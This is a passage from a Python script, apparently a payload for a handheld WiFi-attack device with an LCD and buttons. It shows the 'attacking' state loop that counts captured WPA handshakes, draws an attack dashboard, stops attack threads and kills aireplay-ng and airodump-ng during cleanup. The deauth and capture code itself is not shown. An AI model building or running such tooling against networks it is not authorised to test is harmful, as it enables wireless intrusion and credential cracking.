                time.sleep(0.05)

        # ---------------------------------------------------------------
        # ATTACKING
        # ---------------------------------------------------------------
        elif state == "attacking":
            elapsed = now - attack_start_time

            # Check for new handshake captures -> flash
            if attack_stats["hs_captured"] > prev_hs_count:
                prev_hs_count = attack_stats["hs_captured"]
                hs_flash_until = now + 3.0
                flash_green_capture()

            draw_attack_dashboard(
                selected_targets, attack_stats, elapsed,
                attack_mode, hs_flash_until,
            )

            if btn == "KEY2":
                while get_button(PINS, GPIO) == "KEY2":
                    time.sleep(0.05)
                stop_all(attack_stop, attack_threads_list, WIFI_INTERFACE)
                attack_threads_list = []
                draw_status("Attacks stopped", CLR_YELLOW)
                time.sleep(1.5)
                # Re-enter monitor mode for potential rescan
                ok, WIFI_INTERFACE = validate_setup(WIFI_INTERFACE)
                state = "select"
                if networks:
                    draw_select(networks, selected_index, selected_targets, attack_mode)
                else:
                    state = "idle"
                    draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)

            elif btn == "KEY3":
                while get_button(PINS, GPIO) == "KEY3":
                    time.sleep(0.05)
                stop_all(attack_stop, attack_threads_list, WIFI_INTERFACE)
                attack_threads_list = []
                _running = False
                break

            time.sleep(0.2)

finally:
    # Ensure cleanup
    if attack_threads_list:
        stop_all(attack_stop, attack_threads_list, WIFI_INTERFACE)
    else:
        run_command("pkill -f aireplay-ng 2>/dev/null || true")
        run_command("pkill -f airodump-ng 2>/dev/null || true")
        run_command(f"nmcli device set {WIFI_INTERFACE} managed yes 2>/dev/null || true")
    draw_status("Payload finished")
    time.sleep(1)
    LCD.LCD_Clear()
    GPIO.cleanup()
